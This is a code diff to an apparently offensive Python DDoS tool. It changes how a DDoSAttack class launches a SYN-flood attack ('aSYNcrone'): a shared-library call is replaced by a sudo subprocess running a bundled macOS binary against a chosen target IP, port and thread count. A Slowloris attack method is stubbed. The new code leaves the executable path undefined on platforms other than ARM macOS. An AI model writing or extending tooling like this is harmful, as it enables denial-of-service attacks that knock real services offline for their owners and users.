@@ -3,6 +3,10 @@ import torch.nn as nn
 import threading
 from .random_string_generator import RandomStringGenerator
 import logging
+import os
+import subprocess
+import sys
+import platform
 
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
@@ -35,28 +39,10 @@ class DDoSAttack:
             logging.error(f"Unknown attack type: {self.attack_type}")
 
     def aSYNcrone_attack(self):
-        import ctypes
-
-        # Load the shared library
-        aSYNcrone = ctypes.CDLL("./src/aSYNcrone.so")
-
-        # Assuming the attack function takes four arguments (source port, target IP, target port, threads number)
-        aSYNcrone.attack.argtypes = [
-            ctypes.c_int,
-            ctypes.c_char_p,
-            ctypes.c_int,
-            ctypes.c_int,
-        ]
-        aSYNcrone.attack.restype = ctypes.c_int
-
-        # Run the attack
-        logging.info(f"Running aSYNcrone attack with {self.num_connections} threads")
-        aSYNcrone.attack(
-            self.target_port,
-            self.target_ip.encode(),
-            self.target_port,
-            self.num_connections,
-        )
+        if sys.platform == "darwin" and platform.machine() == "arm64":
+            path_to_executable = os.path.join(os.path.dirname(__file__), 'src/aSYNcrone/aSYNcrone-mac')
+        command = ['sudo', path_to_executable, str(self.target_ip), str(self.target_port), str(self.num_connections)]
+        subprocess.run(command, check=True)
 
     def slowloris_attack(self):
         # TODO: Implement the Slowloris attack here
